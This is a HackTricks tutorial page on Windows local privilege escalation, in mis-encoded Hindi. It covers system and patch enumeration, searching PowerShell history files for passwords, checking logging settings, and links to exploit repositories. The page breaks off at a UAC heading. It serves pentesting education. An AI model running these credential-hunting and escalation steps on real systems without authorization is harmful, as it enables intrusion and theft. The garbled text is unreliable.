# Windows рд╕реНрдерд╛рдиреАрдп рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдЙрдиреНрдирдпрди

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ** [**hacktricks рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks-cloud) **рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ** рдЕрдкрдирд╛ рдпреЛрдЧрджрд╛рди рджреЗрдВред

</details>

### **Windows рд╕реНрдерд╛рдиреАрдп рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдЙрдиреНрдирдпрди рд╡реЗрдХреНрдЯрд░реНрд╕ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рдЯреВрд▓:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## рдкреНрд░рд╛рдердорд┐рдХ Windows рд╕рд┐рджреНрдзрд╛рдВрдд

### рдкрд╣реБрдВрдЪ рдЯреЛрдХрди

**рдпрджрд┐ рдЖрдкрдХреЛ рдкрддрд╛ рдирд╣реАрдВ рд╣реИ рдХрд┐ Windows рдкрд╣реБрдВрдЪ рдЯреЛрдХрди рдХреНрдпрд╛ рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ рдЖрдЧреЗ рдмрдврд╝рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдХреЛ рдкрдврд╝реЗрдВ:**

{% content-ref url="access-tokens.md" %}
[access-tokens.md](access-tokens.md)
{% endcontent-ref %}

### ACLs - DACLs/SACLs/ACEs

**рдпрджрд┐ рдЖрдкрдХреЛ рдкрддрд╛ рдирд╣реАрдВ рд╣реИ рдХрд┐ рдЗрд╕ рдЦрдВрдб рдХреЗ рд╢реАрд░реНрд╖рдХ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдХрд┐рд╕реА рднреА рдПрдХреНрд░реЛрдирд┐рдо рдХрд╛ рдХреНрдпрд╛ рдорддрд▓рдм рд╣реИ, рддреЛ рдЖрдЧреЗ рдмрдврд╝рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдХреЛ рдкрдврд╝реЗрдВ:**

{% content-ref url="acls-dacls-sacls-aces.md" %}
[acls-dacls-sacls-aces.md](acls-dacls-sacls-aces.md)
{% endcontent-ref %}

### рдЕрдЦрдВрдбрддрд╛ рд╕реНрддрд░

**рдпрджрд┐ рдЖрдкрдХреЛ рдкрддрд╛ рдирд╣реАрдВ рд╣реИ рдХрд┐ Windows рдореЗрдВ рдЕрдЦрдВрдбрддрд╛ рд╕реНрддрд░ рдХреНрдпрд╛ рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ рдЖрдЧреЗ рдмрдврд╝рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдХреЛ рдкрдврд╝реЗрдВ:**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

## Windows рд╕реБрд░рдХреНрд╖рд╛ рдирд┐рдпрдВрддреНрд░рдг

Windows рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди рдЪреАрдЬреЗрдВ рд╣реЛ рд╕рдХрддреА рд╣реИрдВ рдЬреЛ рдЖрдкрдХреЛ **рд╕рд┐рд╕реНрдЯрдо рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХ рд╕рдХрддреА рд╣реИрдВ**, рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдХреЛ рд░реЛрдХ рд╕рдХрддреА рд╣реИрдВ рдпрд╛ рдЖрдкрдХреА рдЧрддрд┐рд╡рд┐рдзрд┐рдпреЛрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддреА рд╣реИрдВред рдЖрдкрдХреЛ рдЗрди рд╕рднреА **рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдпреЛрдВ** рдХреА **рдЬрд╛рдВрдЪ** рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП **рдкреГрд╖реНрда** рдХреЛ **рдкрдврд╝реЗрдВ** рдФрд░ **рдЙрди рд╕рднреА** **рд╕реБрд░рдХреНрд╖рд╛** **рдореЗрдХреЗрдирд┐рдЬрд╝реНрдо** рдХреЛ **рдЬрд╛рдВрдЪреЗрдВ** рдЬреЛ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдЙрдиреНрдирдпрди рдЬрд╛рдВрдЪрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ:

{% content-ref url="../authentication-credentials-uac-and-efs.md" %}
[authentication-credentials-uac-and-efs.md](../authentication-credentials-uac-and-efs.md)
{% endcontent-ref %}

## рд╕рд┐рд╕реНрдЯрдо рдЬрд╛рдирдХрд╛рд░реА

### рд╕рдВрд╕реНрдХрд░рдг рдЬрд╛рдирдХрд╛рд░реА рдЬрд╛рдВрдЪрдирд╛

рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ Windows рд╕рдВрд╕реНрдХрд░рдг рдореЗрдВ рдХреЛрдИ рдЬреНрдЮрд╛рдд рд╕реБрд░рдХреНрд╖рд╛ рдЧрдбрд╝рдмрдбрд╝реА рд╣реИ рдпрд╛ рдирд╣реАрдВ (рдкреИрдЪ рднреА рдЬрд╛рдВрдЪреЗрдВ)ред
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### рд╕рдВрд╕реНрдХрд░рдг рд╢реЛрдз

рдпрд╣ [рд╕рд╛рдЗрдЯ](https://msrc.microsoft.com/update-guide/vulnerability) рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рд╕реБрд░рдХреНрд╖рд╛ рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╡рд┐рд╕реНрддреГрдд рдЬрд╛рдирдХрд╛рд░реА рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реИред рдЗрд╕ рдбреЗрдЯрд╛рдмреЗрд╕ рдореЗрдВ 4,700 рд╕реЗ рдЕрдзрд┐рдХ рд╕реБрд░рдХреНрд╖рд╛ рдХрдордЬреЛрд░рд┐рдпрд╛рдВ рд╣реИрдВ, рдЬреЛ рдПрдХ Windows рдкрд░реНрдпрд╛рд╡рд░рдг рдХреЗ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рд╕реНрддреБрдд рдХрд┐рдП рдЧрдП **рд╡рд┐рд╕реНрдлреЛрдЯрдХ рд╣рдорд▓реЗ рдХреЗ рд╕рддрд╣** рдХреЛ рджрд┐рдЦрд╛рддреА рд╣реИрдВред

**рд╕рд┐рд╕реНрдЯрдо рдкрд░**

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas рдореЗрдВ watson рд╕рдореНрдорд┐рд▓рд┐рдд рд╣реИ)_

**рд╕реНрдерд╛рдиреАрдп рддрдерд╛ рд╕рд┐рд╕реНрдЯрдо рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд╕рд╛рде**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**рд╡рд┐рд╕реНрдлреЛрдЯреЛрдВ рдХреЗ Github repos:**

* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### рдкрд░реНрдпрд╛рд╡рд░рдг

рдХреНрдпрд╛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓/рдорд╣рддреНрд╡рдкреВрд░реНрдг рдЬрд╛рдирдХрд╛рд░реА env variables рдореЗрдВ рд╕рд╣реЗрдЬреА рдЧрдИ рд╣реИ?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value
```
### рдкрд╛рд╡рд░рд╢реЗрд▓ рдЗрддрд┐рд╣рд╛рд╕

PowerShell рдПрдХ рд╢рдХреНрддрд┐рд╢рд╛рд▓реА рдХрдорд╛рдВрдб рд▓рд╛рдЗрди рдЗрдВрдЯрд░рдлрд╝реЗрд╕ (CLI) рд╣реИ рдЬреЛ рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рд╡рд┐рдВрдбреЛрдЬрд╝ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдЙрдкрдпреЛрдЧ рд╣реЛрддрд╛ рд╣реИред рдпрд╣ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд╕рд╛рде рдЗрдВрдЯрд░реИрдХреНрдЯ рдХрд░рдиреЗ рдФрд░ рд╡рд┐рднрд┐рдиреНрди рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рд╕рдВрдЪрд╛рд▓рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред PowerShell рдЗрддрд┐рд╣рд╛рд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдЪрд▓рд╛рдП рдЧрдП рд╕рднреА рдХрдорд╛рдВрдбреЛрдВ рдХреЛ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░рддрд╛ рд╣реИред

рдЗрддрд┐рд╣рд╛рд╕ рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реНрдерд╛рди `C:\Users\<Username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline` рд╣реИред рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдкреНрд░рддреНрдпреЗрдХ рдХрдорд╛рдВрдб рдХреЗ рд▓рд┐рдП рдПрдХ рдкрдВрдХреНрддрд┐ рд╣реЛрддреА рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдХрдорд╛рдВрдб рдХрд╛ рд╕рдордп, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдФрд░ рдХрдорд╛рдВрдб рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддрд╛ рд╣реИред

рдЗрддрд┐рд╣рд╛рд╕ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк `Get-History` рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЖрдк `Get-Content` рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрддрд┐рд╣рд╛рд╕ рдлрд╝рд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрддрд┐рд╣рд╛рд╕ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрдорд╛рдВрдбреЛрдВ рдХреЛ рдЕрдкрд╡рд╛рдж рдпрд╛ рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЗрд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рд░рдЦрдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИред рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрддрд┐рд╣рд╛рд╕ рдлрд╝рд╛рдЗрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдЪрд▓рд╛рдП рдЧрдП рдХрдорд╛рдВрдбреЛрдВ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдЕрдирдзрд┐рдХреГрдд рдЧрддрд┐рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП, рдпрд╣ рдЕрдЪреНрдЫрд╛ рд╡рд┐рдЪрд╛рд░ рд╣реИ рдХрд┐ рдЖрдк рдЕрдкрдиреЗ рдЗрддрд┐рд╣рд╛рд╕ рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рд░рдЦреЗрдВ рдФрд░ рдЕрдирдзрд┐рдХреГрдд рдЙрдкрдпреЛрдЧ рд╕реЗ рдмрдЪреЗрдВред
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### рдкрд╛рд╡рд░рд╢реЗрд▓ рдЯреНрд░рд╛рдВрд╕рдХреНрд░рд┐рдкреНрдЯ рдлрд╝рд╛рдЗрд▓реЗрдВ

рдЖрдк рдпрд╣ рд╕реАрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдЗрд╕реЗ рдХреИрд╕реЗ рдЪрд╛рд▓реВ рдХрд░реЗрдВ [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### рдкрд╛рд╡рд░рд╢реЗрд▓ рдореЙрдбреНрдпреВрд▓ рд▓реЙрдЧрд┐рдВрдЧ

рдпрд╣ рдкрд╛рд╡рд░рд╢реЗрд▓ рдХреЗ рдкрд╛рдЗрдкрд▓рд╛рдЗрди рдирд┐рд╖реНрдкрд╛рджрди рд╡рд┐рд╡рд░рдгреЛрдВ рдХреЛ рд░рд┐рдХреЙрд░реНрдб рдХрд░рддрд╛ рд╣реИред рдЗрд╕рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдП рдЧрдП рдХрдорд╛рдВрдб, рдХрдорд╛рдВрдб рдЖрд╣реНрд╡рд╛рди рдФрд░ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдХреБрдЫ рд╣рд┐рд╕реНрд╕рд╛ рд╢рд╛рдорд┐рд▓ рд╣реЛрддрд╛ рд╣реИред рдпрд╣ рдирд┐рд╖реНрдкрд╛рджрди рдФрд░ рдЖрдЙрдЯрдкреБрдЯ рдкрд░рд┐рдгрд╛рдореЛрдВ рдХрд╛ рдкреВрд░рд╛ рд╡рд┐рд╡рд░рдг рдирд╣реАрдВ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред\
рдЖрдк рдЗрд╕реЗ рд╕рдХреНрд╖рдо рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдкрд┐рдЫрд▓реЗ рдЦрдВрдб (рдЯреНрд░рд╛рдВрд╕рдХреНрд░рд┐рдкреНрдЯ рдлрд╝рд╛рдЗрд▓реЗрдВ) рдХреЗ рд▓рд┐рдВрдХ рдХрд╛ рдкрд╛рд▓рди рдХрд░рдХреЗ, рд▓реЗрдХрд┐рди "рдкрд╛рд╡рд░рд╢реЗрд▓ рдЯреНрд░рд╛рдВрд╕реНрдХреНрд░рд┐рдкреНрд╢рди" рдХреА рдмрдЬрд╛рдп "рдореЙрдбреНрдпреВрд▓ рд▓реЙрдЧрд┐рдВрдЧ" рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдХреЗред
```
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
рдкрд╛рд╡рд░рд╢реЗрд▓ рд▓реЙрдЧреНрд╕ рд╕реЗ рдкрд┐рдЫрд▓реЗ 15 рдШрдЯрдирд╛рдУрдВ рдХреЛ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдмреНрд▓реЙрдХ рд▓реЙрдЧрд┐рдВрдЧ**

рдпрд╣ рдХреЛрдб рдмреНрд▓реЙрдХ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд╕рдордп рд░рд┐рдХреЙрд░реНрдб рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреА рдкреВрд░реА рдЧрддрд┐рд╡рд┐рдзрд┐ рдФрд░ рдкреВрд░реА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдкреНрд░рддреНрдпреЗрдХ рдЧрддрд┐рд╡рд┐рдзрд┐ рдХрд╛ рдкреВрд░рд╛ рдСрдбрд┐рдЯ рдЯреНрд░реЗрд▓ рдмрдирд╛рдП рд░рдЦрддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдмрд╛рдж рдореЗрдВ рдлреЛрд░реЗрдВрд╕рд┐рдХреНрд╕ рдФрд░ рджреБрд╖реНрдЯ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рдЕрдзреНрдпрдпрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рд╕рдордп рд╕рднреА рдЧрддрд┐рд╡рд┐рдзрд┐ рдХреЛ рд░рд┐рдХреЙрд░реНрдб рдХрд░рддрд╛ рд╣реИ рдЗрд╕рд▓рд┐рдП рдкреВрд░реА рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред
```
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдмреНрд▓реЙрдХ рд▓реЙрдЧрд┐рдВрдЧ рдШрдЯрдирд╛рдПрдВ рд╡рд┐рдВрдбреЛрдЬ рдЗрд╡реЗрдВрдЯ рд╡реНрдпреВрдЕрд░ рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкрде рдХреЗ рддрд╣рдд рдорд┐рд▓ рд╕рдХрддреА рд╣реИрдВ: _рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдФрд░ рд╕реЗрд╡рд╛ рд▓реЙрдЧ > рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ > рд╡рд┐рдВрдбреЛрдЬ > рдкрд╛рд╡рд░рд╢реЗрд▓ > рдСрдкрд░реЗрд╢рдирд▓_\
рдкрд┐рдЫрд▓реЗ 20 рдШрдЯрдирд╛рдУрдВ рдХреЛ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### рдЗрдВрдЯрд░рдиреЗрдЯ рд╕реЗрдЯрд┐рдВрдЧреНрд╕

#### Internet Explorer Enhanced Security Configuration (IE ESC)

Internet Explorer Enhanced Security Configuration (IE ESC) рдПрдХ рд╡рд┐рд╢реЗрд╖рддрд╛ рд╣реИ рдЬреЛ Windows Server рдЗрдВрд╕реНрдЯрд╛рд▓реЗрд╢рди рдкрд░ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рд╕рдХреНрд╖рдо рд╣реЛрддреА рд╣реИред рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рд╕реБрд╡рд┐рдзрд╛рдУрдВ рдХреЛ рдмрдврд╝рд╛рддрд╛ рд╣реИ рдФрд░ рдЗрдВрдЯрд░рдиреЗрдЯ рдПрдХреНрд╕рдкреНрд▓реЛрд░рд░ рдХреЗ рдЙрдкрдпреЛрдЧ рдХреЛ рд╕реАрдорд┐рдд рдХрд░рддрд╛ рд╣реИред рдЗрд╕реЗ рдЕрдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрди рдЪрд░рдгреЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ:

1. рд╕рд░реНрд╡рд░ рдкреНрд░рдмрдВрдзрдХ рдЦреЛрд▓реЗрдВ рдФрд░ "Local Server" рдЪреБрдиреЗрдВред
2. "IE Enhanced Security Configuration" рдХреЛ рдмрдВрдж рдХрд░реЗрдВред

#### Proxy Settings

рдкреНрд░реЙрдХреНрд╕реА рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдЕрдкрдиреЗ рдЗрдВрдЯрд░рдиреЗрдЯ рдХрдиреЗрдХреНрд╢рди рдХреЛ рдХрдВрдкреНрдпреВрдЯрд░ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд░реВрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рд▓рд┐рдП рдирд┐рдореНрди рдЪрд░рдгреЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ:

1. "Internet Options" рдЦреЛрд▓реЗрдВ рдФрд░ "Connections" рдЯреИрдм рдкрд░ рдЬрд╛рдПрдВред
2. "LAN settings" рдмрдЯрди рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред
3. "Use a proxy server for your LAN" рдСрдкреНрд╢рди рдХреЛ рдЪреБрдиреЗрдВ рдФрд░ рдкреНрд░реЙрдХреНрд╕реА рд╕рд░реНрд╡рд░ рдХрд╛ рдкрддрд╛ рдФрд░ рдкреЛрд░реНрдЯ рджрд░реНрдЬ рдХрд░реЗрдВред
4. "OK" рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ рдФрд░ рд╕рднреА рдЦрд┐рдбрд╝рдХрд┐рдпреЛрдВ рдХреЛ рдмрдВрдж рдХрд░реЗрдВред

#### Windows Firewall

Windows рдлрд╝рд╛рдпрд░рд╡реЙрд▓ рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рд╕реБрд╡рд┐рдзрд╛ рд╣реИ рдЬреЛ рдЖрдкрдХреЗ рд╕рд┐рд╕реНрдЯрдо рдХреЛ рдЕрдирдзрд┐рдХреГрдд рдиреЗрдЯрд╡рд░реНрдХ рдПрдХреНрд╕реЗрд╕ рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рд░рдЦрддреА рд╣реИред рдЗрд╕реЗ рдирд┐рдореНрди рдЪрд░рдгреЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░рдХреЗ рд╕рдХреНрд╖рдо рдХрд░реЗрдВ:

1. "Windows Security" рдЦреЛрд▓реЗрдВ рдФрд░ "Firewall & network protection" рдЪреБрдиреЗрдВред
2. "Domain network", "Private network", рдФрд░ "Public network" рдХреЗ рд▓рд┐рдП "Firewall" рдХреЛ рдЪрд╛рд▓реВ рдХрд░реЗрдВред

#### User Account Control (UAC)

